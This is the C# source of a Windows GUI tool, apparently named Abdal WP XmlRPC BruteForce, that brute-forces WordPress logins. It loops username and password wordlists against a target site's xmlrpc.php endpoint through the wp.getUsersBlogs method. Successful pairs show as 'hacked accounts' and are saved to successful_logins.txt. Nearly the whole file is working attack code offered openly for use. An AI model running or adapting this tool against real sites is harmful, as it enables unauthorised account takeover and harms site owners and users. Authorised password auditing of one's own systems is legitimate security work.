using Abdal_Security_Group_App.Core;
using System.Diagnostics;
using System.Reflection;
using CookComputing.XmlRpc;
using Telerik.WinControls.UI;


namespace Abdal_Security_Group_App
{
    // Define the XML-RPC interface for WordPress
    [XmlRpcUrl("https://example.com/xmlrpc.php")] // Placeholder URL, will be dynamically replaced
    public interface IWordPressXmlRpc : IXmlRpcProxy
    {
        [XmlRpcMethod("wp.getUsersBlogs")]
        object[] GetUsersBlogs(string username, string password);
    }

    public partial class Main : Telerik.WinControls.UI.RadForm
    {
        private bool username_file_selected = false;

        private string[] usernames_list = Array.Empty<string>();
        private string[] passwords_list = Array.Empty<string>();


        private Int32 attackCounter = 0;
        private bool stop_attack_status = false;
        private string abdal_app_name = Assembly.GetExecutingAssembly().GetName().ToString().Split(',')[0];
        private AbdalSoundPlayer ab_player = new AbdalSoundPlayer();

        private string abdal_app_name_for_url = Assembly.GetExecutingAssembly().GetName().ToString().Split(',')[0]
            .ToLower().Replace(' ', '-');

        public Main()
        {
            InitializeComponent();
            //change form title
            Version version = Assembly.GetExecutingAssembly().GetName().Version!;
            Text = abdal_app_name + " " + version.Major + "." + version.Minor;

            // Call Global Chilkat Unlock
            ChilkatMng.UnlockChilkat();
        }

        #region Dragable Form Start

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST)
                m.Result = (IntPtr)(HT_CAPTION);
        }

        private const int WM_NCHITTEST = 0x84;
        private const int HT_CLIENT = 0x1;
        private const int HT_CAPTION = 0x2;

        #endregion

        private void Main_Load(object sender, EventArgs e)
        {
            openFileDialogUserName.FileName = "";
            openFileDialogPassword.FileName = "";
            this.desk_alert.ThemeName = "visualStudio2022DarkTheme1";
        }

        private void menuItem_github_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://github.com/ebrasha/abdal-wp-xmlrpc-bruteforce")
                { UseShellExecute = true });
        }

        private void menuItem_gitlab_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://gitlab.com/ebrasha/abdal-wp-xmlrpc-bruteforce")
                { UseShellExecute = true });
        }

        private void menuItem_donate_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo("https://donate.abdalagency.ir/") { UseShellExecute = true });
        }

        private void menuItem_about_us_Click(object sender, EventArgs e)
        {
            about_us about_form = new Abdal_Security_Group_App.about_us();
            about_form.ShowDialog();
            about_form.TopMost = true;
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            ab_player.sPlayer("checkbox");
            Process.GetCurrentProcess().Kill();
            Environment.Exit(0);
        }

        private void bg_worker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            if (e.Cancelled == true)
            {
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "Canceled Process By User!";
                this.desk_alert.Show();
                ab_player.sPlayer("cancel");
            }
            else if (e.Error != null)
            {
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = e.Error.Message;
                this.desk_alert.Show();


                ab_player.sPlayer("error");
            }
            else
            {
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "Done!";
                this.desk_alert.Show();

                if (stop_attack_status)
                {
                    ab_player.sPlayerSync("cancel");
                }
                else
                {
                    ab_player.sPlayerSync("op-com");
                }

                ab_player.sPlayer("done");
            }
        }

        public static bool IsValidHttpOrHttpsUrl(string url)
        {
            Uri? uriResult;
            bool result = Uri.TryCreate(url, UriKind.Absolute, out uriResult)
                          && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
            return result;
        }

        private void btn_start_Click(object sender, EventArgs e)
        {
            stop_attack_status = false;

            if (openFileDialogUserName.FileName == "")
            {
                ab_player.sPlayer("error");
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "Please Select the usernames file";
                this.desk_alert.Show();
            }
            else if (openFileDialogPassword.FileName == "")
            {
                ab_player.sPlayer("error");
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "Please Select the usernames file";
                this.desk_alert.Show();
            }
            else if (!IsValidHttpOrHttpsUrl(tb_url_target.Text))
            {
                ab_player.sPlayer("error");
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "Please Enter The valid Target URL";
                this.desk_alert.Show();
            }

            else if (tb_url_target.Text == "")
            {
                ab_player.sPlayer("error");
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "Please Enter Target URL";
                this.desk_alert.Show();
            }

            else
            {
                list_attack_log.Items.Clear();
                list_failed_attack.Items.Clear();
                list_hacked_accounts.Items.Clear();

                list_attack_log.ResetText();
                list_failed_attack.ResetText();
                list_hacked_accounts.ResetText();


                if (bg_worker.IsBusy != true)
                {
                    bg_worker.RunWorkerAsync();
                }
            }
        }

        private void CheckAndClearListSafe()
        {
            if (list_attack_log.InvokeRequired)
            {
                // If the current thread is not the UI thread, use Invoke to execute this method on the UI thread.
                list_attack_log.Invoke(new MethodInvoker(CheckAndClearListSafe));
            }
            else
            {
                // This code runs on the UI thread.
                if (list_attack_log.Items.Count > 300)
                {
                    list_attack_log.Items.Clear();
                }
            }
        }


        private void bg_worker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            #region bg_worker_DoWork

            bool success = false;
            IWordPressXmlRpc proxy = XmlRpcProxyGen.Create<IWordPressXmlRpc>();

            attackStatusProgressBar.Value1 = 0;
            attackStatusProgressBar.Value2 = 0;
            attackCounter = 0;
            attackStatusProgressBar.Value2 = usernames_list.Length;

            try
            {
                if (tb_url_target != null && tb_url_target.Text.EndsWith("/"))
                {
                    tb_url_target.Text = tb_url_target.Text.Remove(tb_url_target.Text.Length - 1);
                    tb_url_target.SelectionStart = tb_url_target.Text.Length;
                }

                if (tb_url_target != null && !string.IsNullOrEmpty(tb_url_target.Text))
                {
                    proxy.Url = $"{tb_url_target.Text}/xmlrpc.php";
                }
            }
            catch (Exception)
            {
            }


            ab_player.sPlayer("start");


            #region Start Loop

            foreach (var username in usernames_list)
            {
                foreach (var password in passwords_list)
                {
                    attackCounter++;
                    attackStatusProgressBar.Text = $"Attack Status / {attackCounter}";

                    CheckAndClearListSafe();

                    list_attack_log.SelectedIndex = list_attack_log.Items.Count - 1;

                    try
                    {
                        if (proxy.GetUsersBlogs(username, password).Length > 0)
                        {
                            // File.AppendAllText("successful_logins.txt",
                            //     $"Username: {username}, Password: {password}\n");

                            list_hacked_accounts.Items.Add($"Username: {username}, Password: {password}");
                            success = true;
                            File.AppendAllText("successful_logins.txt",
                                $"Username: {username}, Password: {password}\n");

                            ab_player.sPlayerSync("account-hc");
                            break; // Exit after the first successful login
                        }
                    }
                    catch (Exception ex)
                    {
                        list_attack_log.Items.Add($"Failed with username {username} and password {password}");
                        list_attack_log.Items.Add($"Server Error =  {ex.Message}");
                        // int visibleItems = list_attack_log.ClientSize.Height /
                        //                    list_attack_log.ItemHeight;
                        // list_attack_log.ScrollMode = Math.Max(list_attack_log.Items.Count - visibleItems + 1, 0);

                        if (ex.Message == "Service Unavailable"
                            || ex.Message.Contains("An error occurred while sending the request")
                            || ex.Message.Contains(
                                "No connection could be made because the target machine actively refused it")
                           )
                        {
                            list_failed_attack.Items.Add(password);
                            if (list_failed_attack.Items.Count > 60)
                            {
                                using (StreamWriter writer = new StreamWriter("list_failed_attack_password.txt", true))
                                {
                                    foreach (var item in list_failed_attack.Items)
                                    {
                                        writer.WriteLine(item.ToString());
                                    }
                                }

                                list_failed_attack.Items.Clear();
                            }

                            attackCounter++;
                        }
                    }

                    if (stop_attack_status) break;
                }

                if (success) break; // Exit the outer loop if a login was successful
                if (stop_attack_status) break;
                {
                }
            }

            if (!success)
            {
                ab_player.sPlayerSync("error");
                list_attack_log.Items.Add("All login attempts failed.");
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = "All login attempts failed.";
                this.desk_alert.Show();
            }

            #endregion

            #endregion
        }

        private void radButton1_Click(object sender, EventArgs e)
        {
            try
            {
                openFileDialogUserName.AddExtension = false;
                openFileDialogUserName.Title = "Abdal WP XmlRPC BruteForce - Get Username File";
                openFileDialogUserName.DefaultExt = "txt";
                openFileDialogUserName.Filter = "Username List |*.txt";
                openFileDialogUserName.CheckFileExists = true;
                openFileDialogUserName.CheckPathExists = true;
                openFileDialogUserName.FileName = "";
                DialogResult result = openFileDialogUserName.ShowDialog();

                if (result == DialogResult.OK)
                {
                    username_file_selected = true;
                    string filePath = openFileDialogUserName.FileName;
                    usernames_list = File.ReadAllLines(filePath);
                }
            }
            catch (Exception ex)
            {
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = ex.Message;
                this.desk_alert.Show();
            }
        }

        private void radButton3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void radRepeatButton1_Click(object sender, EventArgs e)
        {
            stop_attack_status = true;
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void radButton2_Click(object sender, EventArgs e)
        {
            try
            {
                openFileDialogPassword.AddExtension = false;
                openFileDialogPassword.Title = "Abdal WP XmlRPC BruteForce - Get Passwords List";
                openFileDialogPassword.DefaultExt = "txt";
                openFileDialogPassword.Filter = "Passwords List |*.txt";
                openFileDialogPassword.CheckFileExists = true;
                openFileDialogPassword.CheckPathExists = true;
                openFileDialogPassword.FileName = "";
                DialogResult result = openFileDialogPassword.ShowDialog();

                if (result == DialogResult.OK)
                {
                    username_file_selected = true;
                    string filePath = openFileDialogPassword.FileName;
                    passwords_list = File.ReadAllLines(filePath);
                }
            }
            catch (Exception ex)
            {
                this.desk_alert.CaptionText = abdal_app_name;
                this.desk_alert.ContentText = ex.Message;
                this.desk_alert.Show();
            }
        }

        private void radGroupBox1_Click(object sender, EventArgs e)
        {
        }

        private void openFileDialogPassword_FileOk(object sender, System.ComponentModel.CancelEventArgs e)
        {
        }
    }
}